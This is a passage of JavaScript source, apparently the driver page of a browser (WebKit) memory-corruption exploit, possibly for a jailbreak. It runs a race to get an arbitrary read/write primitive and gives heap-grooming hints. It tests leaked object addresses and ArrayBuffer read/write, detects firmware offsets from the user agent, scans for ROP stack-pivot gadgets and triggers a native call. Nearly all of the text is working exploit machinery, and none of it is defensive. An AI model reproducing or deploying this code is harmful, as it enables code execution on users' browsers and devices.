        state("native call failed", "bad");
    } finally {
        busy = false;
        setUi();
    }
}

async function loadExploit() {
    if (exploit) return exploit;
    mark("LOAD", "core.js + mem.js");
    const core = await import("./core.js");
    exploit = {
        establishPrimitive: core.establishPrimitive,
        installWindowP,
    };
    return exploit;
}

function attemptCap() {
    if (!params.has("attempts")) return 0;
    const n = parseInt(params.get("attempts"), 10);
    return n > 0 ? n : 0;
}

function onRaceEvent(tag, detail) {
    if (!CORE_LOG.test(tag)) return;
    mark(tag, detail || "");

    if (tag === "ATTEMPT-START") {
        raceAttempt++;
        state("race attempt " + raceAttempt + "…", "warn");
        if (raceAttempt === 15 || raceAttempt === 30 || raceAttempt === 50)
            mark("HINT-GROOM", "still missing? close browser fully → reload → tap 512 or max groom");
    }

    if (/COMPOSITION-LENGTH-MISS|SSV-PLACEMENT-MISS|ZERO-HEADER-MISS/.test(tag)) {
        lengthMissStreak++;
        if (lengthMissStreak === 8 || lengthMissStreak === 20)
            mark("HINT-GROOM", "COMPOSITION-LENGTH-MISS = race lost — tap 512 drain or max groom, close browser, reload");
    }

    if (tag === "READ-PRIMITIVE-PASS" || tag === "PRIMITIVE-OK")
        lengthMissStreak = 0;
}

async function establishOnce(establishPrimitive) {
    raceAttempt = 0;
    lengthMissStreak = 0;
    raceBuf.length = 0;
    raceMode = true;
    const cap = attemptCap();
    try {
        return await establishPrimitive({
            maxAttempts: cap,
            skipTrimDebris: true,
            onEvent: (t, d, a) => onRaceEvent(t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });
    } finally {
        raceMode = false;
        for (let i = 0; i < raceBuf.length; i++) {
            const line = raceBuf[i];
            const tag = line.split(/\s/)[0];
            if (/FAIL|ERROR|GIVE-UP|READ-PRIMITIVE|TRIM|PRIMITIVE|PAIR|HINT/i.test(tag)) {
                let dup = false;
                for (let j = 0; j < lines.length; j++) {
                    if (lines[j] === line) { dup = true; break; }
                }
                if (!dup) lines.push(line);
            }
        }
        raceBuf.length = 0;
        if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
        flushPersistMilestones();
        renderOut();
    }
}

function bufAddr(p, off, ab) {
    const cell = walkCell(p, "ArrayBuffer", ab);
    const impl = read8p(p, cell.add32(off.wk_ArrayBuffer_m_impl));
    if (!impl) return null;
    addPtr("ArrayBuffer impl", impl, "+0x" + off.wk_ArrayBuffer_m_impl.toString(16));
    const data = read8p(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
    if (data) addPtr("ArrayBuffer backing", data, "m_contents.m_data");
    return data;
}

async function runRwProof(p, off) {
    const boxA = { tag: "demoA", n: 1 };
    const boxB = { tag: "demoB", n: 2 };
    walkCell(p, "JSObject A", boxA);
    walkCell(p, "JSObject B", boxB);

    const rowA = pointers.filter(x => x.label === "JSObject A cell").pop();
    const rowB = pointers.filter(x => x.label === "JSObject B cell").pop();
    const addrA = rowA ? parseAddr(String(rowA.addr).replace(/^0x/i, "")) : null;
    const addrB = rowB ? parseAddr(String(rowB.addr).replace(/^0x/i, "")) : null;

    const okLeak = addrA && addrB && !same64(addrA, addrB) && addrA.low !== 0;
    mark(okLeak ? "PASS" : "FAIL", "leakval-distinct  a=" + addrA + " b=" + addrB);

    const headerA = okLeak ? p.read8(addrA) : null;
    if (headerA) {
        p.write8(addrA, headerA);
    }
    const okHdr = headerA && same64(p.read8(addrA), headerA);
    mark(okHdr ? "PASS" : "FAIL", "read8-write8 header roundtrip");

    const probe = new ArrayBuffer(0x20);
    retained.push(probe);
    const view = new Uint32Array(probe);
    view[0] = 0xcafebabe;

    if (off) {
        const dataPtr = bufAddr(p, off, probe);
        if (!dataPtr) {
            mark("FAIL", "arraybuffer backing chain");
        } else {
            const got = read4p(p, dataPtr);
            const okR = got === 0xcafebabe;
            mark(okR ? "PASS" : "FAIL", "arraybuffer-read4  got=0x"
                + (got == null ? "null" : got.toString(16)));
            if (okR) {
                p.write4(dataPtr, new int64(0x600dbabe, 0));
                mark(view[0] === 0x600dbabe ? "PASS" : "FAIL", "arraybuffer-write4");
            }
        }
        captureNativeChain(p, off.wk_JSFunction_m_function || 0x28, off);
    }

    try { walkCell(p, "parseFloat", parseFloat); } catch (_) { }
    try { walkCell(p, "Object proto", Object); } catch (_) { }

    addPairStatusPtrs();
    renderMap();
    mark("ADDR-LIST", pointers.length + " pointers logged above");

    return okLeak && okHdr;
}

async function runStart() {
    if (busy || ready) return;
    busy = true;
    setUi();
    lines.length = 0;
    raceBuf.length = 0;
    if (RESTORE_LOG) restorePersistedLog();
    else clearPersistedLog();
    if (outEl) outEl.textContent = "";
    pointers.length = 0;
    renderMap();

    const detected = offsetsFor(navigator.userAgent);
    mark("UA-FW", detected.key || "unknown");
    state("getting primitive…", "warn");

    try {
        const { establishPrimitive, installWindowP: installP } = await loadExploit();
        let carrier;
        try {
            carrier = await establishOnce(establishPrimitive);
        } catch (err) {
            if (/gave up/i.test(String(err.message))) {
                mark("HINT-GROOM", "race lost — close browser fully, reload, tap 512 or max groom, Start again");
            }
            throw err;
        }

        installP(carrier, {
            promote: PROMOTE_PAIR,
            onEvent: (t, d) => {
                if (/PAIR|TRIM|RELEASE|FAIL|ERROR/i.test(t))
                    mark(t, d || "");
            },
        });
        const p = window.p;
        if (!p) throw new Error("window.p missing");

        nativeAllowed = pairStatus.state !== "broken";
        mark("PRIMITIVE-OK", "arb rw live");
        mark("PAIR-STATUS", "state=" + pairStatus.state
            + " promoted=" + pairStatus.promoted);
        ready = true;
        state("primitive OK — tap Save bases, then test gadgets", "ok");
    } catch (err) {
        state("failed: " + err.message, "bad");
        mark("ERROR", err.stack || err.message);
    } finally {
        busy = false;
        setUi();
    }
}

function refreshMap() {
    runRwProofManual();
}

function reportErr(err) {
    const msg = err && err.message ? err.message : String(err);
    state("error: " + msg, "bad");
    mark("ERROR", err && err.stack ? err.stack : msg);
}

function wireClick(el, fn) {
    if (!el) return;
    el.addEventListener("click", function () {
        try {
            const r = fn();
            if (r && typeof r.then === "function")
                r.catch(reportErr);
        } catch (err) {
            reportErr(err);
        }
    });
}

function init() {
    outEl = $("out");
    stateEl = $("state");
    mapBody = $("map-body");
    hexEl = $("hex");
    pickPtr = $("pick-ptr");
    addrIn = $("addr-in");
    btnStart = $("btn-start");
    btnSaveBases = $("btn-save-bases");
    btnRwProof = $("btn-rw-proof");
    btnNative = $("btn-native");
    btnVerifyPivot = $("btn-verify-pivot");
    btnScanPivot = $("btn-scan-pivot");
    btnPeek = $("btn-peek");
    btnClear = $("btn-clear");

    if (!outEl || !btnStart) {
        state("UI missing — open via HTTP(S), not file://", "bad");
        return;
    }

    wireGadgetBars();
    wireG5Bar();
    wireClick(btnStart, function () { return runStart(); });
    wireClick(btnSaveBases, saveBasesManual);
    wireClick(btnRwProof, function () { return runRwProofManual(); });
    wireClick(btnVerifyPivot, verifyPivotManual);
    wireClick(btnScanPivot, function () { return runPivotScanAuto(); });
    wireClick(btnNative, function () { return runNativeCall(); });
    wireClick(btnClear, function () {
        lines.length = 0;
        clearPersistedLog();
        if (outEl) outEl.textContent = "";
        mark("LOG-CLEAR", "sessionStorage log cleared");
    });
    wireClick(btnPeek, function () {
        const a = parseAddr(addrIn.value);
        if (!a) { mark("PEEK-FAIL", "bad hex"); return; }
        peekAt(a);
    });

    if (pickPtr) {
        pickPtr.addEventListener("change", function () {
            const i = parseInt(pickPtr.value, 10);
            if (!(i >= 0) || !pointers[i]) return;
            addrIn.value = pointers[i].addr.replace(/^0x/i, "");
        });
    }

    if (params.get("clearpivot") === "1") {
        try {
            sessionStorage.removeItem("wk-pivot-scan-state");
            sessionStorage.removeItem("wk-scanned-pivot");
            sessionStorage.removeItem("wk-scanned-pivot-base");
        } catch (_) { }
    }
    if (sanitizeScannedPivotStorage())
        mark("PIVOT-FIX", "removed poisoned G0-G4 scan RVAs from session");

    const g5raw = params.get("g5");
    if (g5raw) {
        const g5rva = parseInt(String(g5raw).replace(/^0x/i, ""), 16);
        if (g5rva > 0) {
            const found = loadScannedPivot() || Object.assign({}, PIVOT_HW_1352);
            found.wk_PUSH_RDX_POP_RSP_RET = g5rva;
            try { sessionStorage.setItem("wk-scanned-pivot", JSON.stringify(found)); } catch (_) { }
            mark("G5-MANUAL", "+0x" + g5rva.toString(16) + " from ?g5= URL");
        }
    }

    if (params.get("clearlog") === "1") clearPersistedLog();
    else if (RESTORE_LOG && restorePersistedLog()) renderOut();

    mark("BOOT", "build=" + BUILD_ID + " — IAT via ELF/PLT xref (not brute GOT)");
    mark("BOOT", groomBootLine(params));
    window.addEventListener("beforeunload", function () {
        stopPivotScanQuiet();
        if (stateEl) persistState(stateEl.textContent, stateEl.className);
        if (nativeChain) try { nativeChain.disarm(); } catch (_) { }
    });
    wireGroomBar(() => busy);
    setUi();
    state("ready — Start → Save bases → scan/verify pivot → Native call", "");
}

function bootUi() {
    try {
        init();
    } catch (err) {
        reportErr(err);
    }
}

if (document.readyState === "loading")
    document.addEventListener("DOMContentLoaded", bootUi);
else
    bootUi();
